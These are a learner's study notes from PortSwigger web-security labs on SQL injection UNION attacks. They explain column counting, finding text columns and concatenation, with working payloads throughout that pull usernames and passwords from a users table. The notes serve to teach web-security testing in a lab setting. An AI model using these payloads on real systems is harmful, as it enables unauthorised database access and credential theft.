# Day 3 — SQL injection UNION attacks

## What UNION does
- `UNION` joins the results of two SELECT queries into one result set.
- If I inject a second SELECT into the original query, the page shows its rows too,
  as if they were normal results (e.g. usernames showing up as product names).

      SELECT name, price FROM products WHERE category = 'Gifts'
      UNION
      SELECT username, password FROM users

- Injected through the parameter: `Gifts' UNION SELECT username, password FROM users--`
  - `'` closes the original string
  - `UNION SELECT ...` is my query
  - `--` comments out the rest of the original query (e.g. `' AND released = 1`),
    otherwise the leftover part breaks the syntax

## The two rules
1. **Same number of columns** in both SELECTs, otherwise the database errors
   ("each UNION query must have the same number of columns").
2. **Compatible data types** in each column. Text cannot go into a numeric column.

So every UNION attack has three steps:
1. Find **how many** columns the query returns.
2. Find **which** columns accept text.
3. Put the data I want in those columns.

## Step 1: counting columns
- **ORDER BY:** increase the number until it errors. The last one that works is the
  column count.

      ' ORDER BY 1--   → 200
      ' ORDER BY 2--   → 200
      ' ORDER BY 3--   → 200
      ' ORDER BY 4--   → 500   → 3 columns

- **UNION SELECT NULL:** add NULLs until it stops erroring.

      ' UNION SELECT NULL--             → 500
      ' UNION SELECT NULL,NULL--        → 500
      ' UNION SELECT NULL,NULL,NULL--   → 200   → 3 columns

- Why NULL: it is compatible with every data type, so only the number of columns is
  being tested.
- On Oracle every SELECT needs a FROM: `' UNION SELECT NULL FROM dual--`

## Step 2: finding text columns
- Replace one NULL at a time with a string and keep the rest NULL:

      ' UNION SELECT 'a',NULL,NULL--   → 500  (not text)
      ' UNION SELECT NULL,'a',NULL--   → 200  (text)
      ' UNION SELECT NULL,NULL,'a'--   → 500  (not text)

- One at a time, so if it errors I know which column caused it.
- The single quotes make `'a'` a string. Without them the database looks for a column
  named `a`.

## Step 3: reading other tables
- Replace the NULLs with real columns: `' UNION SELECT username, password FROM users--`
- The table and column names must be known. PortSwigger gives them in the lab; in a real
  test they can be found through `information_schema` (a catalog of all tables and
  columns in most databases), read with the same UNION technique.

## Step 3b: two values in a single column
- Problem: sometimes only ONE column accepts text, but I want both username and password.
- Solution: concatenate the two values into one string, with a separator in between so I
  can tell them apart.
- The concatenation syntax depends on the database:
  - PostgreSQL / Oracle: `username || '~' || password`
  - MySQL: `CONCAT(username, '~', password)`
- Example (PostgreSQL): `' UNION SELECT NULL, username || '~' || password FROM users--`
  - Result in one column: `administrator~s3cr3t`
- Pick a separator that will not appear in a password, e.g. `~`.
- So: first find which database is running, then use the right concatenation syntax.
- The `|` characters may need URL-encoding in the request (Burp Repeater: select, Cmd+U).

## OR 1=1 vs UNION
- `OR 1=1` changes **which rows** the original query returns (all rows of the same table).
- `UNION` changes **where the data comes from** (any other table).

## Why UNION SQLi is serious
- Data exfiltration: it can read any table, not just bypass one login.
- With real passwords the access stays even after the SQLi is fixed.
- Plaintext passwords can be reused on other services (credential stuffing).
- A normal login with a correct password looks legitimate in the logs.

## Practical notes
- A 500 does not always mean the technique is wrong. Check the payload for typos in
  column or table names first.
- Count the columns again in every new lab or endpoint. Never assume.
- PortSwigger lab instances expire after a few hours. A request from an old lab gets
  no response, so send a fresh one from HTTP history.

## Key takeaway
UNION turns SQL injection from bypassing a check into reading the database. The method
is always: count columns, find text columns, then select the data.
